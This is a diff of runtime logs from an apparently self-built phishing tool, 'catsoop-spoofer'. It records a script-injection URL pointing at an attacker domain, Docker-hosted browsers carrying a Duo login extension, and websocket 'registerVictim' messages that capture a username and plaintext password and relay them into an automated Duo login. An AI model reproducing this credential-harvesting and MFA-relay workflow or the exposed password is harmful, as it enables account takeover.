@@ -1,197 +1,250 @@
 Read Phishing URL: https://6002.catsoop.org/S20/%3cscript%20src=%68ttps%3a6002.ml/
 Read Attacker Domain Name: 6002.ml
 Read Firefox Path: /home/tjz/.mozilla/firefox
-Multiple ipv4 addresses found. Which one is portforwarding on port 80?
-0: 127.0.0.1
-1: 192.168.0.17
-2: 172.17.0.1
-Select IP by index:Traceback (most recent call last):
-  File "run-spoof.py", line 38, in <module>
-    i = input("Select IP by index:")
-OSError: [Errno 9] Bad file descriptor
-starting docker process at: 1589755146453
-Archive:  /tmp/duo10528.zip
-  inflating: /tmp/duo10528/background.js  
-  inflating: /tmp/duo10528/duo-login.js  
-  inflating: /tmp/duo10528/manifest.json  
-  inflating: /tmp/duo10528/popup.html  
- extracting: /tmp/duo10528/icon32.png  
-  inflating: /tmp/duo10528/popup.js  
-  adding: background.js (deflated 61%)
-  adding: duo-login.js (deflated 65%)
-  adding: icon32.png (stored 0%)
-  adding: manifest.json (deflated 46%)
-  adding: popup.html (deflated 30%)
-  adding: popup.js (deflated 59%)
-running docker command at: 1589755146606
-starting docker process at: 1589755146915
-Archive:  /tmp/duo10529.zip
-  inflating: /tmp/duo10529/background.js  
-  inflating: /tmp/duo10529/duo-login.js  
-  inflating: /tmp/duo10529/manifest.json  
-  inflating: /tmp/duo10529/popup.html  
- extracting: /tmp/duo10529/icon32.png  
-  inflating: /tmp/duo10529/popup.js  
-  adding: background.js (deflated 61%)
-  adding: duo-login.js (deflated 65%)
-  adding: icon32.png (stored 0%)
-  adding: manifest.json (deflated 46%)
-  adding: popup.html (deflated 30%)
-  adding: popup.js (deflated 59%)
-running docker command at: 1589755147087
-Read Phishing URL: https://6002.catsoop.org/S20/%3cscript%20src=%68ttps%3a6002.ml/
-Read Attacker Domain Name: 6002.ml
-Read Firefox Path: /home/tjz/.mozilla/firefox
 Localhost is 192.168.0.17
 Starting https server on port 443...
 Using key /home/tjz/Programming/catsoop-spoofer/ssl/key.pem
 Using certificate /home/tjz/Programming/catsoop-spoofer/ssl/cert.pem
 Trying to host https server on 192.168.0.17:443
-Traceback (most recent call last):
-  File "run-spoof.py", line 47, in <module>
-    https_server.startServer(host)
-  File "/home/tjz/Programming/catsoop-spoofer/client/https_server.py", line 21, in startServer
-    httpd = HTTPServer((host, 443), SilentHTTPRequestHandler)
-  File "/usr/lib/python3.6/socketserver.py", line 456, in __init__
-    self.server_bind()
-  File "/usr/lib/python3.6/http/server.py", line 136, in server_bind
-    socketserver.TCPServer.server_bind(self)
-  File "/usr/lib/python3.6/socketserver.py", line 470, in server_bind
-    self.socket.bind(self.server_address)
-OSError: [Errno 98] Address already in use
-Read Phishing URL: https://6002.catsoop.org/S20/%3cscript%20src=%68ttps%3a6002.ml/
-Read Attacker Domain Name: 6002.ml
-Read Firefox Path: /home/tjz/.mozilla/firefox
-Localhost is 192.168.0.17
-Starting https server on port 443...
+Starting backend server...
+resfreshing duo website...
+duo refreshed...
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10834 10834 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10834
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10835 10835 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10835
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10836 10836 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10836
+starting docker process at: 1589850041919
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10837 10837 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10837
+starting docker process at: 1589850041921
+starting docker process at: 1589850041922
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10838 10838 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10838
+DOCKER_MANAGER:# availbale backends: 5
 Using key /home/tjz/Programming/catsoop-spoofer/ssl/key.pem
 Using certificate /home/tjz/Programming/catsoop-spoofer/ssl/cert.pem
-Trying to host https server on 192.168.0.17:443
-Traceback (most recent call last):
-  File "run-spoof.py", line 47, in <module>
-    https_server.startServer(host)
-  File "/home/tjz/Programming/catsoop-spoofer/client/https_server.py", line 21, in startServer
-    httpd = HTTPServer((host, 443), SilentHTTPRequestHandler)
-  File "/usr/lib/python3.6/socketserver.py", line 456, in __init__
-    self.server_bind()
-  File "/usr/lib/python3.6/http/server.py", line 136, in server_bind
-    socketserver.TCPServer.server_bind(self)
-  File "/usr/lib/python3.6/socketserver.py", line 470, in server_bind
-    self.socket.bind(self.server_address)
-OSError: [Errno 98] Address already in use
-f15b31bf003c96453e99a002cbe96ab55ab6dd0004047ab17aceb6dde14a30c5
-starting docker process at: 1589755483637
-Archive:  /tmp/duo10529.zip
-  inflating: /tmp/duo10529/background.js  
-  inflating: /tmp/duo10529/duo-login.js  
-  inflating: /tmp/duo10529/manifest.json  
-  inflating: /tmp/duo10529/popup.html  
- extracting: /tmp/duo10529/icon32.png  
-  inflating: /tmp/duo10529/popup.js  
-  adding: background.js (deflated 61%)
-  adding: duo-login.js (deflated 65%)
-  adding: icon32.png (stored 0%)
-  adding: manifest.json (deflated 46%)
-  adding: popup.html (deflated 30%)
-  adding: popup.js (deflated 59%)
-running docker command at: 1589755484250
-docker: Error response from daemon: Conflict. The container name "/firefoxSID10529" is already in use by container "f15b31bf003c96453e99a002cbe96ab55ab6dd0004047ab17aceb6dde14a30c5". You have to remove (or rename) that container to be able to reuse that name.
-See 'docker run --help'.
-starting docker process at: 1589755484290
-Archive:  /tmp/duo10530.zip
-  inflating: /tmp/duo10530/background.js  
-  inflating: /tmp/duo10530/duo-login.js  
-  inflating: /tmp/duo10530/manifest.json  
-  inflating: /tmp/duo10530/popup.html  
- extracting: /tmp/duo10530/icon32.png  
-  inflating: /tmp/duo10530/popup.js  
-  adding: background.js (deflated 61%)
-  adding: duo-login.js (deflated 65%)
-  adding: icon32.png (stored 0%)
-  adding: manifest.json (deflated 46%)
-  adding: popup.html (deflated 30%)
-  adding: popup.js (deflated 59%)
-running docker command at: 1589755484461
-starting docker process at: 1589756091346
-Archive:  /tmp/duo10531.zip
-  inflating: /tmp/duo10531/background.js  
-  inflating: /tmp/duo10531/duo-login.js  
-  inflating: /tmp/duo10531/manifest.json  
-  inflating: /tmp/duo10531/popup.html  
- extracting: /tmp/duo10531/icon32.png  
-  inflating: /tmp/duo10531/popup.js  
-  adding: background.js (deflated 61%)
-  adding: duo-login.js (deflated 65%)
-  adding: icon32.png (stored 0%)
-  adding: manifest.json (deflated 46%)
-  adding: popup.html (deflated 30%)
-  adding: popup.js (deflated 59%)
-running docker command at: 1589756096515
-6e07d3f499cb27da99502d38eb5ff9fb33a4cae763c0916974d29e4aafdf2368
-starting docker process at: 1589756105319
-Archive:  /tmp/duo10532.zip
-  inflating: /tmp/duo10532/background.js  
-  inflating: /tmp/duo10532/duo-login.js  
-  inflating: /tmp/duo10532/manifest.json  
-  inflating: /tmp/duo10532/popup.html  
- extracting: /tmp/duo10532/icon32.png  
-  inflating: /tmp/duo10532/popup.js  
-  adding: background.js (deflated 61%)
-  adding: duo-login.js (deflated 65%)
-  adding: icon32.png (stored 0%)
-  adding: manifest.json (deflated 46%)
-  adding: popup.html (deflated 30%)
-  adding: popup.js (deflated 59%)
-running docker command at: 1589756105547
-f6da839dcb34b032605090dca1f0c8404252c45be08f863b734071d8cf3ecbca
-Archive:  /tmp/duo10531.zip
-  inflating: /tmp/duo10531/background.js  
-  inflating: /tmp/duo10531/duo-login.js  
-  inflating: /tmp/duo10531/manifest.json  
-  inflating: /tmp/duo10531/popup.html  
- extracting: /tmp/duo10531/icon32.png  
-  inflating: /tmp/duo10531/popup.js  
+starting docker process at: 1589850041925
+Starting Socket Server on Port 80
+starting docker process at: 1589850041925
+Archive:  /tmp/duo10834.zip
+  inflating: /tmp/duo10834/background.js  
+  inflating: /tmp/duo10834/duo-login.js  Archive:  /tmp/duo10835.zip
+
+  inflating: /tmp/duo10834/manifest.json  
+  inflating: /tmp/duo10834/popup.html  
+ extracting: /tmp/duo10834/icon32.png    inflating: /tmp/duo10835/background.js  
+  inflating: /tmp/duo10834/popup.js  
+
+  inflating: /tmp/duo10835/duo-login.js  
+  inflating: /tmp/duo10835/manifest.json  
+  inflating: /tmp/duo10835/popup.html  
+ extracting: /tmp/duo10835/icon32.png  
+  inflating: /tmp/duo10835/popup.js  
   adding: background.js (deflated 61%)
   adding: duo-login.js (deflated 64%)
   adding: icon32.png (stored 0%)
   adding: manifest.json (deflated 46%)
   adding: popup.html (deflated 30%)
   adding: popup.js (deflated 59%)
-the input device is not a TTY
-starting docker process at: 1589756149065
-Archive:  /tmp/duo10533.zip
-  inflating: /tmp/duo10533/background.js  
-  inflating: /tmp/duo10533/duo-login.js  
-  inflating: /tmp/duo10533/manifest.json  
-  inflating: /tmp/duo10533/popup.html  
- extracting: /tmp/duo10533/icon32.png  
-  inflating: /tmp/duo10533/popup.js  
   adding: background.js (deflated 61%)
-  adding: duo-login.js (deflated 65%)
+  adding: duo-login.js (deflated 64%)
   adding: icon32.png (stored 0%)
   adding: manifest.json (deflated 46%)
   adding: popup.html (deflated 30%)
   adding: popup.js (deflated 59%)
-running docker command at: 1589756149273
-53f36dd815896d340dd2a56d9e978f5135dbbb30494fd73d0db29608b7a0caab
+running docker command at: 1589850041967
+running docker command at: 1589850041968
+Archive:  /tmp/duo10836.zip
+  inflating: /tmp/duo10836/background.js  
+  inflating: /tmp/duo10836/duo-login.js  
+  inflating: /tmp/duo10836/manifest.json  
+  inflating: /tmp/duo10836/popup.html  
+ extracting: /tmp/duo10836/icon32.png  
+  inflating: /tmp/duo10836/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+Archive:  /tmp/duo10838.zip
+  inflating: /tmp/duo10838/background.js  
+  inflating: /tmp/duo10838/duo-login.js  
+  inflating: /tmp/duo10838/manifest.json  
+  inflating: /tmp/duo10838/popup.html  
+ extracting: /tmp/duo10838/icon32.png  
+  inflating: /tmp/duo10838/popup.js  
+running docker command at: 1589850041981
+  adding: background.js (deflated 61%)
+  adding: duo-login.jsArchive:  /tmp/duo10837.zip
+  inflating: /tmp/duo10837/background.js   (deflated 64%)
+  adding: icon32.png
+  inflating: /tmp/duo10837/duo-login.js   (stored 0%)
+  adding: manifest.json
+  inflating: /tmp/duo10837/manifest.json  
+ (deflated 46%)
+  adding: popup.html  inflating: /tmp/duo10837/popup.html  
+ (deflated 30%)
+  adding: popup.js extracting: /tmp/duo10837/icon32.png  
+  inflating: /tmp/duo10837/popup.js   (deflated 59%)
+
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589850042002
+running docker command at: 1589850041995
+1b065d81d2cf9daa12f1bf1108555052854efdcce65facc229722ac55bea4169
+dbf040babefe46115181b9cf76ee105cdfe1dbd77c021a9ac4ddbf13a0adcd0d
+76988abfa206313ac6cb0f1778fc9110965a0c413357117254d1002b641917b0
+e2e6b0b69595d8166d68d1ef4410c8b3df5256447586e6446cee115916e1e3dc
+8814a8cb279f3071d9610e0b51a1db941c7169b69dd4fb788b1896d729c49ca6
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e96f2198> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e96e9358> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e96be828> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e8656240> ; /
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e8656978> ; /
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e866c550> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589851694672', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589851694672 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:Longest alive backend time: 1653.2782201766968 with bid:  10834
+DOCKER_MANAGER:available backends:  4  or  4 out of 5
+DOCKER_MANAGER:backend [bid= 10834 ;sid= 1589851694672 ] claimed
+DOCKER_MANAGER:Executing: /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh 10834 1589851694672 tjz babygirl@physx3894
+DOCKER_MANAGER:cmd:  ['/home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh', '10834', '1589851694672', 'tjz', 'babygirl@physx3894']
+DOCKER_MANAGER:<=  5 idle backends... Starting new
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10839 10839 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10839
+starting docker process at: 1589851695201
+Archive:  /tmp/duo10834.zip
+  inflating: /tmp/duo10834/background.js  
+  inflating: /tmp/duo10834/duo-login.js  
+  inflating: /tmp/duo10834/manifest.json  
+  inflating: /tmp/duo10834/popup.html  
+ extracting: /tmp/duo10834/icon32.png  
+  inflating: /tmp/duo10834/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+Archive:  /tmp/duo10839.zip
+  inflating: /tmp/duo10839/background.js  
+  inflating: /tmp/duo10839/duo-login.js  
+  inflating: /tmp/duo10839/manifest.json  
+  inflating: /tmp/duo10839/popup.html  
+ extracting: /tmp/duo10839/icon32.png  
+  inflating: /tmp/duo10839/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589851695240
+the input device is not a TTY
+ce52d272a02e863591fe67661d82b0c187ceacc16606c00f5ad894018d0b1ff7
+SOCKET_SERVER:received:  {'action': 'setAuthMethod', 'authm': '0', 'id': 'victim', 'sid': '1589851694672'}
+SOCKET_SERVER:backend 10834 is NOT ready, waiting to send auth method
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e8642898> ; /
+resfreshing duo website...
+duo refreshed...
+SOCKET_SERVER:received:  {'action': 'cancelPressed', 'id': 'victim', 'sid': '1589851694672'}
+SOCKET_SERVER:victim 1589851694672 closing...
+DOCKER_MANAGER:released from SID backend: 10834
 ERROR:websockets.server:Error in connection handler
 Traceback (most recent call last):
   File "/home/tjz/.local/lib/python3.6/site-packages/websockets/server.py", line 191, in handler
     await self.ws_handler(self, path)
-  File "/home/tjz/Programming/catsoop-spoofer/backend/socket_server.py", line 97, in counter
-    await websocket.send(json.dumps({"pong":"pong"}));
-  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 555, in send
+  File "/home/tjz/Programming/catsoop-spoofer/backend/socket_server.py", line 152, in counter
+    await sessions[SID]["backend"].send(json.dumps(data))
+AttributeError: 'NoneType' object has no attribute 'send'
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e86191d0> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589851694672', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589851694672 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:Longest alive backend time: 1687.6582658290863 with bid:  10834
+DOCKER_MANAGER:available backends:  5  or  5 out of 6
+DOCKER_MANAGER:backend [bid= 10834 ;sid= 1589851694672 ] claimed
+DOCKER_MANAGER:Executing: /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh 10834 1589851694672 tjz babygirl@physx3894
+DOCKER_MANAGER:cmd:  ['/home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh', '10834', '1589851694672', 'tjz', 'babygirl@physx3894']
+DOCKER_MANAGER:<=  5 idle backends... Starting new
+DOCKER_MANAGER:Executing /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-backend.sh 10840 10840 6002.ml
+DOCKER_MANAGER:View at: http://localhost:10840
+starting docker process at: 1589851729584
+Archive:  /tmp/duo10834.zip
+  inflating: /tmp/duo10834/background.js  
+  inflating: /tmp/duo10834/duo-login.js  
+  inflating: /tmp/duo10834/manifest.json  
+  inflating: /tmp/duo10834/popup.html  
+ extracting: /tmp/duo10834/icon32.png  
+  inflating: /tmp/duo10834/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+Archive:  /tmp/duo10840.zip
+  inflating: /tmp/duo10840/background.js  
+  inflating: /tmp/duo10840/duo-login.js  
+  inflating: /tmp/duo10840/manifest.json  
+  inflating: /tmp/duo10840/popup.html  
+ extracting: /tmp/duo10840/icon32.png  
+  inflating: /tmp/duo10840/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+running docker command at: 1589851729616
+the input device is not a TTY
+925ba0707f179584fef6220f4a687023cd35c8ef81c40e7bc6257ab97a8eda14
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e8443630> ; /
+SOCKET_SERVER:victim 1589851694672 closing...
+DOCKER_MANAGER:released from SID backend: 10834
+ERROR:websockets.server:Error in connection handler
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/server.py", line 191, in handler
+    await self.ws_handler(self, path)
+  File "/home/tjz/Programming/catsoop-spoofer/backend/socket_server.py", line 100, in counter
+    async for message in websocket:
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 439, in __aiter__
+    yield await self.recv()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 509, in recv
     await self.ensure_open()
   File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 812, in ensure_open
     raise self.connection_closed_exc()
 websockets.exceptions.ConnectionClosedError: code = 4001 (private use), no reason
-Archive:  /tmp/duo10531.zip
-  inflating: /tmp/duo10531/background.js  
-  inflating: /tmp/duo10531/duo-login.js  
-  inflating: /tmp/duo10531/manifest.json  
-  inflating: /tmp/duo10531/popup.html  
- extracting: /tmp/duo10531/icon32.png  
-  inflating: /tmp/duo10531/popup.js  
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e96cc128> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589851694672', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589851694672 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:Longest alive backend time: 1879.5797579288483 with bid:  10834
+DOCKER_MANAGER:available backends:  6  or  6 out of 7
+DOCKER_MANAGER:backend [bid= 10834 ;sid= 1589851694672 ] claimed
+DOCKER_MANAGER:Executing: /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh 10834 1589851694672 tjz babygirl@physx3894
+DOCKER_MANAGER:cmd:  ['/home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh', '10834', '1589851694672', 'tjz', 'babygirl@physx3894']
+Archive:  /tmp/duo10834.zip
+  inflating: /tmp/duo10834/background.js  
+  inflating: /tmp/duo10834/duo-login.js  
+  inflating: /tmp/duo10834/manifest.json  
+  inflating: /tmp/duo10834/popup.html  
+ extracting: /tmp/duo10834/icon32.png  
+  inflating: /tmp/duo10834/popup.js  
   adding: background.js (deflated 61%)
   adding: duo-login.js (deflated 64%)
   adding: icon32.png (stored 0%)
@@ -199,6 +252,8 @@ Archive:  /tmp/duo10531.zip
   adding: popup.html (deflated 30%)
   adding: popup.js (deflated 59%)
 the input device is not a TTY
+SOCKET_SERVER:victim 1589851694672 closing...
+DOCKER_MANAGER:released from SID backend: 10834
 ERROR:websockets.server:Error in connection handler
 Traceback (most recent call last):
   File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 827, in transfer_data
@@ -215,14 +270,1029 @@ Traceback (most recent call last):
     yield from self._wait_for_data('readexactly')
   File "/usr/lib/python3.6/asyncio/streams.py", line 464, in _wait_for_data
     yield from self._waiter
-concurrent.futures._base.CancelledError
+  File "/usr/lib/python3.6/asyncio/selector_events.py", line 714, in _read_ready
+    data = self._sock.recv(self.max_size)
+ConnectionResetError: [Errno 104] Connection reset by peer
 
 The above exception was the direct cause of the following exception:
 
 Traceback (most recent call last):
   File "/home/tjz/.local/lib/python3.6/site-packages/websockets/server.py", line 191, in handler
     await self.ws_handler(self, path)
-  File "/home/tjz/Programming/catsoop-spoofer/backend/socket_server.py", line 93, in counter
+  File "/home/tjz/Programming/catsoop-spoofer/backend/socket_server.py", line 100, in counter
+    async for message in websocket:
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 439, in __aiter__
+    yield await self.recv()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 509, in recv
+    await self.ensure_open()
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/protocol.py", line 803, in ensure_open
+    raise self.connection_closed_exc()
+websockets.exceptions.ConnectionClosedError: code = 1006 (connection closed abnormally [internal]), no reason
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+resfreshing duo website...
+duo refreshed...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e84b5a58> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589860929766', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589860929766 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:Longest alive backend time: 10888.335202932358 with bid:  10834
+DOCKER_MANAGER:available backends:  6  or  6 out of 7
+DOCKER_MANAGER:backend [bid= 10834 ;sid= 1589860929766 ] claimed
+DOCKER_MANAGER:Executing: /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh 10834 1589860929766 tjz babygirl@physx3894
+DOCKER_MANAGER:cmd:  ['/home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh', '10834', '1589860929766', 'tjz', 'babygirl@physx3894']
+Archive:  /tmp/duo10834.zip
+  inflating: /tmp/duo10834/background.js  
+  inflating: /tmp/duo10834/duo-login.js  
+  inflating: /tmp/duo10834/manifest.json  
+  inflating: /tmp/duo10834/popup.html  
+ extracting: /tmp/duo10834/icon32.png  
+  inflating: /tmp/duo10834/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+the input device is not a TTY
+SOCKET_SERVER:received:  {'action': 'setAuthMethod', 'authm': '0', 'id': 'victim', 'sid': '1589860929766'}
+SOCKET_SERVER:backend 10834 is NOT ready, waiting to send auth method
+SOCKET_SERVER:received:  {'action': 'cancelPressed', 'id': 'victim', 'sid': '1589860929766'}
+SOCKET_SERVER:victim 1589860929766 closing...
+DOCKER_MANAGER:released from SID backend: 10834
+ERROR:websockets.server:Error in connection handler
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/server.py", line 191, in handler
+    await self.ws_handler(self, path)
+  File "/home/tjz/Programming/catsoop-spoofer/backend/socket_server.py", line 152, in counter
+    await sessions[SID]["backend"].send(json.dumps(data))
+AttributeError: 'NoneType' object has no attribute 'send'
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e8619898> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589860929766', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589860929766 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:Longest alive backend time: 10901.61223435402 with bid:  10834
+DOCKER_MANAGER:available backends:  6  or  6 out of 7
+DOCKER_MANAGER:backend [bid= 10834 ;sid= 1589860929766 ] claimed
+DOCKER_MANAGER:Executing: /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh 10834 1589860929766 tjz babygirl@physx3894
+DOCKER_MANAGER:cmd:  ['/home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh', '10834', '1589860929766', 'tjz', 'babygirl@physx3894']
+Archive:  /tmp/duo10834.zip
+  inflating: /tmp/duo10834/background.js  
+  inflating: /tmp/duo10834/duo-login.js  
+  inflating: /tmp/duo10834/manifest.json  
+  inflating: /tmp/duo10834/popup.html  
+ extracting: /tmp/duo10834/icon32.png  
+  inflating: /tmp/duo10834/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+the input device is not a TTY
+SOCKET_SERVER:received:  {'action': 'setAuthMethod', 'authm': '0', 'id': 'victim', 'sid': '1589860929766'}
+SOCKET_SERVER:backend 10834 is NOT ready, waiting to send auth method
+SOCKET_SERVER:victim 1589860929766 closing...
+DOCKER_MANAGER:released from SID backend: 10834
+resfreshing duo website...
+duo refreshed...
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e8406320> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589861004406', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589861004406 starting auth
+USERNAME PASS FOUND
+DOCKER_MANAGER:Longest alive backend time: 10962.949832439423 with bid:  10834
+DOCKER_MANAGER:available backends:  6  or  6 out of 7
+DOCKER_MANAGER:backend [bid= 10834 ;sid= 1589861004406 ] claimed
+DOCKER_MANAGER:Executing: /home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh 10834 1589861004406 tjz babygirl@physx3894
+DOCKER_MANAGER:cmd:  ['/home/tjz/Programming/catsoop-spoofer/backend/containers/sh/launch-tab.sh', '10834', '1589861004406', 'tjz', 'babygirl@physx3894']
+Archive:  /tmp/duo10834.zip
+  inflating: /tmp/duo10834/background.js  
+  inflating: /tmp/duo10834/duo-login.js  
+  inflating: /tmp/duo10834/manifest.json  
+  inflating: /tmp/duo10834/popup.html  
+ extracting: /tmp/duo10834/icon32.png  
+  inflating: /tmp/duo10834/popup.js  
+  adding: background.js (deflated 61%)
+  adding: duo-login.js (deflated 64%)
+  adding: icon32.png (stored 0%)
+  adding: manifest.json (deflated 46%)
+  adding: popup.html (deflated 30%)
+  adding: popup.js (deflated 59%)
+the input device is not a TTY
+SOCKET_SERVER:received:  {'action': 'setAuthMethod', 'authm': '0', 'id': 'victim', 'sid': '1589861004406'}
+SOCKET_SERVER:backend 10834 is NOT ready, waiting to send auth method
+SOCKET_SERVER:received:  {'action': 'setAuthMethod', 'authm': '0', 'id': 'victim', 'sid': '1589861004406'}
+SOCKET_SERVER:backend 10834 is NOT ready, waiting to send auth method
+SOCKET_SERVER:received:  {'action': 'cancelPressed', 'id': 'victim', 'sid': '1589861004406'}
+SOCKET_SERVER:victim 1589861004406 closing...
+DOCKER_MANAGER:released from SID backend: 10834
+ERROR:websockets.server:Error in connection handler
+Traceback (most recent call last):
+  File "/home/tjz/.local/lib/python3.6/site-packages/websockets/server.py", line 191, in handler
+    await self.ws_handler(self, path)
+  File "/home/tjz/Programming/catsoop-spoofer/backend/socket_server.py", line 152, in counter
+    await sessions[SID]["backend"].send(json.dumps(data))
+AttributeError: 'NoneType' object has no attribute 'send'
+SOCKET_SERVER:Websocket connected: <websockets.server.WebSocketServerProtocol object at 0x7f92e8406978> ; /
+SOCKET_SERVER:received:  {'action': 'registerVictim', 'username': 'tjz', 'password': 'babygirl@physx3894', 'sid': '1589861004406', 'id': 'victim'}
+SOCKET_SERVER:Created new session 1589861004406 starting auth
+USERNAME PASS FOUND
